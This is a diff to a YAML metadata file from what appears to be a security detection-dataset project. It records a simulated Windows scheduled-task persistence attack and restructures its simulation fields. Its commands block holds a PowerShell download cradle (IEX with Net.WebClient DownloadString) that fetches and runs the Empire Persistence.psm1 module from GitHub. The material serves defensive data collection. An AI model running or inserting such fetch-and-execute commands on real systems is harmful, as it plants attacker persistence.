@@ -32,15 +32,10 @@ datasets:
       link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190319-SchTasksCreation-Userland/WORKSTATION6_Windows_MicrosoftWindowsTaskSchedulerOperational.zip
 
 simulation:
-  environment: Blacksmith
-  tools:
-    - type: Manual
-      name: PowerShell
-      module: PowerShell
-      script: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1
-  permissions_required:
-    - User
-  adversary_view: |-
+  executor: PowerShell
+  scriptUri: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1
+  supportingFileUris:
+  commands: |-
     Adversary Box
     -------------
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1')
@@ -76,8 +71,7 @@ simulation:
 
     Run
     ---
-    PS C:\Windows\system32>.\Persistence.ps1
-    
-    PS C:\Windows\system32>
+    .\Persistence.ps1
+  output: |-
 
 references:
